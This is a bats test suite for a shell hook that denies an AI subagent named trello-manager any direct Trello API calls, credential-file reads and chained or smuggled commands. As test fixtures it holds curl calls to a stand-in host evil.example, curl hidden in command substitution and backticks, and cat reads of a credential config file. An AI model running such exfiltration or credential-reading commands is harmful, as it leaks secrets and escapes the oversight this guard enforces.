#!/usr/bin/env bats
# Tests for hooks/trello-manager-cli-guard.sh — a PreToolUse (Bash matcher)
# hook that enforces trello-manager's own declared boundary: it may only
# reach Trello through the trello CLI, never by hitting the REST API
# directly or reading its credential file.
#
# Pure bats: bats-support/bats-assert/bats-file are not installed in this
# environment (see hooks/tests/prompt-file-guard.bats for the same
# fallback), so assertions use plain bash/jq instead of those libraries.
#
# This hook never shells out to a real network tool (curl, wget, ...) or to
# the real trello CLI itself — is_allowed_command() only inspects the
# command string, it never executes it. So almost none of this suite needs
# PATH guarding. The one exception is the jq-absent fail-open test, which
# prefixes a stub dir onto PATH to make jq unresolvable while keeping bash
# resolvable (bash and jq live in the same real directory on dev/CI
# machines, so simply dropping jq's directory would break the hook's own
# "#!/usr/bin/env bash" shebang too); that test proves its own filtering
# actually removed jq, every run, before trusting the rest of it.

HOOK="${BATS_TEST_DIRNAME}/../trello-manager-cli-guard.sh"

# Pipe an arbitrary raw string to the hook's stdin.
run_hook_raw() {
  printf '%s' "$1" | "$HOOK"
}

# Build a well-formed JSON payload for the hook's stdin.
# $1=command  $2=agent_id (omit/empty for no agent_id key)
# $3=agent_type (omit/empty for no agent_type key)
build_payload() {
  local command="$1" agent_id="${2:-}" agent_type="${3:-}"
  jq -n --arg cmd "$command" --arg aid "$agent_id" --arg atype "$agent_type" '
    {tool_name: "Bash", tool_input: {command: $cmd}}
    + (if $aid != "" then {agent_id: $aid} else {} end)
    + (if $atype != "" then {agent_type: $atype} else {} end)
  '
}

# Assert the most recent `run` produced a well-formed deny decision: exit 0,
# valid JSON, correct hookEventName/permissionDecision, and a non-empty
# reason that mentions trello (so the model is pointed at the CLI).
assert_deny() {
  local reason
  [ "$status" -eq 0 ]
  [ -n "$output" ]
  jq -e . >/dev/null <<< "$output"
  [ "$(jq -r '.hookSpecificOutput.hookEventName' <<< "$output")" = "PreToolUse" ]
  [ "$(jq -r '.hookSpecificOutput.permissionDecision' <<< "$output")" = "deny" ]
  reason="$(jq -r '.hookSpecificOutput.permissionDecisionReason' <<< "$output")"
  [ -n "$reason" ]
  [[ "$reason" == *"trello"* ]]
}

# Assert the most recent `run` stayed silent: exit 0, empty stdout.
assert_silent() {
  [ "$status" -eq 0 ]
  [ -z "$output" ]
}

@test "1: trello-manager running curl directly is denied" {
  run run_hook_raw "$(build_payload "curl https://api.trello.com/1/boards" "a1" "trello-manager")"
  assert_deny
}

@test "2: trello-manager running a plain trello command is allowed" {
  run run_hook_raw "$(build_payload "trello card:list --board X --list Y" "a1" "trello-manager")"
  assert_silent
}

@test "3: trello-manager running the documented cache-check idiom is allowed" {
  run run_hook_raw "$(build_payload 'test -f ~/.trello-cli/default/trello.db && echo "cache exists, skip sync" || trello sync' "a1" "trello-manager")"
  assert_silent
}

@test "4: trello-manager running wget to reach the API is denied" {
  run run_hook_raw "$(build_payload "wget https://api.trello.com/1/boards" "a1" "trello-manager")"
  assert_deny
}

@test "5: trello-manager running python3 -c to reach the API is denied" {
  run run_hook_raw "$(build_payload "python3 -c \"import requests; requests.get('https://api.trello.com')\"" "a1" "trello-manager")"
  assert_deny
}

@test "6: trello-manager running node -e to reach the API is denied" {
  run run_hook_raw "$(build_payload "node -e \"require('https').get('https://api.trello.com')\"" "a1" "trello-manager")"
  assert_deny
}

@test "7: trello-manager wrapping curl in sh -c is denied" {
  run run_hook_raw "$(build_payload 'sh -c "curl https://api.trello.com"' "a1" "trello-manager")"
  assert_deny
}

@test "8: trello-manager reading the credential file with cat is denied" {
  run run_hook_raw "$(build_payload "cat ~/.trello-cli/default/config.json" "a1" "trello-manager")"
  assert_deny
}

@test "9: trello-manager reading the credential file with sed is denied" {
  run run_hook_raw "$(build_payload "sed -n '1p' ~/.trello-cli/default/config.json" "a1" "trello-manager")"
  assert_deny
}

@test "10: main-thread curl (no agent_id) is allowed" {
  run run_hook_raw "$(build_payload "curl https://api.trello.com/1/boards")"
  assert_silent
}

@test "11: a different subagent's curl is allowed" {
  run run_hook_raw "$(build_payload "curl https://api.trello.com/1/boards" "a1" "some-other-agent")"
  assert_silent
}

@test "12: malformed JSON on stdin stays silent (identity cannot be determined)" {
  run run_hook_raw 'not valid json{'
  assert_silent
}

@test "13: trello-manager call missing tool_input.command entirely is denied" {
  run run_hook_raw '{"tool_name":"Bash","agent_id":"a1","agent_type":"trello-manager","tool_input":{}}'
  assert_deny
}

@test "14: trello-manager chaining a real trello call with curl via && is denied" {
  run run_hook_raw "$(build_payload "trello sync && curl https://evil.example" "a1" "trello-manager")"
  assert_deny
}

@test "15: trello-manager chaining a real trello call with curl via ; is denied" {
  run run_hook_raw "$(build_payload "trello sync; curl https://evil.example" "a1" "trello-manager")"
  assert_deny
}

@test "16: trello-manager piping a trello call into another command is denied" {
  run run_hook_raw "$(build_payload "trello card:list --board X --list Y | grep foo" "a1" "trello-manager")"
  assert_deny
}

@test "17: trello-manager smuggling curl via command substitution is denied" {
  # shellcheck disable=SC2016 # single quotes are intentional: this is literal
  # test-fixture text passed through as a jq --arg value, not meant to expand.
  run run_hook_raw "$(build_payload 'trello card:comment --id 1 --text "$(curl https://evil.example)"' "a1" "trello-manager")"
  assert_deny
}

@test "18: trello-manager smuggling curl via backticks is denied" {
  # shellcheck disable=SC2016 # single quotes are intentional: this is literal
  # test-fixture text passed through as a jq --arg value, not meant to expand.
  run run_hook_raw "$(build_payload 'trello card:comment --id 1 --text "`curl https://evil.example`"' "a1" "trello-manager")"
  assert_deny
}

@test "19: the word trello appearing only as a curl argument is denied" {
  run run_hook_raw "$(build_payload 'curl -X POST -d "service=trello" https://evil.example' "a1" "trello-manager")"
  assert_deny
}

@test "20: a cache-idiom lookalike with an injected extra command is denied" {
  run run_hook_raw "$(build_payload 'test -f ~/.trello-cli/default/trello.db && echo "x" && curl https://evil.example || trello sync' "a1" "trello-manager")"
  assert_deny
}

@test "21: a cache-idiom lookalike with command substitution in the echo message is denied" {
  # shellcheck disable=SC2016 # single quotes are intentional: this is literal
  # test-fixture text passed through as a jq --arg value, not meant to expand.
  run run_hook_raw "$(build_payload 'test -f ~/.trello-cli/default/trello.db && echo "$(curl https://evil.example)" || trello sync' "a1" "trello-manager")"
  assert_deny
}

@test "22: a lookalike name (trellocorp) is not mistaken for the trello CLI" {
  run run_hook_raw "$(build_payload "trellocorp sync" "a1" "trello-manager")"
  assert_deny
}

@test "23: agent_id present but agent_type absent is treated as unconfirmed and allowed" {
  run run_hook_raw '{"tool_name":"Bash","agent_id":"a1","tool_input":{"command":"curl https://api.trello.com"}}'
  assert_silent
}

@test "24: trello-manager redirecting output with > is denied" {
  run run_hook_raw "$(build_payload "trello sync > /tmp/out" "a1" "trello-manager")"
  assert_deny
}

@test "25: trello-manager redirecting input with < is denied" {
  run run_hook_raw "$(build_payload "trello card:list < /etc/passwd" "a1" "trello-manager")"
  assert_deny
}

@test "26: trello-manager running trello interactive is denied" {
  run run_hook_raw "$(build_payload "trello interactive" "a1" "trello-manager")"
  assert_deny
  [[ "$(jq -r '.hookSpecificOutput.permissionDecisionReason' <<< "$output")" == *"interactive"* ]]
}

@test "27: trello-manager running a quoted trello \"interactive\" is still denied" {
  # shellcheck disable=SC2016 # single quotes are intentional: this is literal
  # test-fixture text passed through as a jq --arg value, not meant to expand.
  run run_hook_raw "$(build_payload 'trello "interactive"' "a1" "trello-manager")"
  assert_deny
  [[ "$(jq -r '.hookSpecificOutput.permissionDecisionReason' <<< "$output")" == *"interactive"* ]]
}

@test "28: trello-manager setting the API key via auth:api-key is denied" {
  run run_hook_raw "$(build_payload "trello auth:api-key SOME_SECRET_VALUE" "a1" "trello-manager")"
  assert_deny
  [[ "$(jq -r '.hookSpecificOutput.permissionDecisionReason' <<< "$output")" == *"auth:api-key"* ]]
}

@test "29: trello-manager setting the token via auth:token is denied" {
  run run_hook_raw "$(build_payload "trello auth:token SOME_SECRET_VALUE" "a1" "trello-manager")"
  assert_deny
  [[ "$(jq -r '.hookSpecificOutput.permissionDecisionReason' <<< "$output")" == *"auth:token"* ]]
}

@test "30: the words interactive and auth appearing only as argument content (not the subcommand position) are allowed" {
  run run_hook_raw "$(build_payload 'trello card:comment --id 1 --text "switch to interactive mode after auth:token rotation"' "a1" "trello-manager")"
  assert_silent
}

@test "31: jq absent from PATH makes the hook silently allow (fail open), and the PATH filtering that proves it is checked every run" {
  local payload saved_path stub_dir entry filtered_path

  # Build the payload while jq is still reachable — build_payload itself
  # shells out to the real jq.
  payload="$(build_payload "curl https://api.trello.com/1/boards" "a1" "trello-manager")"

  saved_path="$PATH"

  # Stub dir holding only a symlink to the real bash, so the hook's own
  # "#!/usr/bin/env bash" shebang still resolves once jq's directory is
  # dropped from PATH below (bash and jq live in the same directory here).
  stub_dir="$BATS_TEST_TMPDIR/bash-only"
  mkdir -p "$stub_dir"
  ln -s "$(command -v bash)" "$stub_dir/bash"

  filtered_path=""
  while IFS= read -r entry; do
    [ -n "$entry" ] || continue
    [ -x "$entry/jq" ] && continue
    filtered_path="${filtered_path:+$filtered_path:}$entry"
  done < <(printf '%s\n' "${PATH//:/$'\n'}")
  PATH="$stub_dir:$filtered_path"

  # Prove the filtered PATH actually makes jq unresolvable before trusting
  # the rest of this test — otherwise a jq install this filter missed would
  # let this test pass for the wrong reason (exercising the jq-present
  # path, not the fail-open branch under test).
  run command -v jq
  [ "$status" -ne 0 ]

  run run_hook_raw "$payload"
  PATH="$saved_path"
  assert_silent
}

@test "32: a harmless non-trello diagnostic (command -v trello) gets a mechanism-accurate reason, not the API-bypass wording" {
  # Regression guard for a real end-to-end finding: trello-manager ran
  # `command -v trello` (a diagnostic that touches neither the API-bypass
  # nor the credential-read boundary), was correctly denied, but the reason
  # text used to describe only those two scenarios — leading the model to
  # wrongly conclude that `command`/`which` were blacklisted by name. The
  # fix folded the API-bypass/credential-read wording and the shape-mismatch
  # mechanism into one reason (SHAPE_MISMATCH_REASON), so this asserts the
  # mechanism statement and the concrete command -v example are present;
  # it goes red if that statement is ever dropped back to the old
  # examples-only wording.
  run run_hook_raw "$(build_payload "command -v trello" "a1" "trello-manager")"
  assert_deny
  local reason
  reason="$(jq -r '.hookSpecificOutput.permissionDecisionReason' <<< "$output")"
  [[ "$reason" == *"與指令名稱本身無關"* ]]
  [[ "$reason" == *"command -v trello"* ]]
}
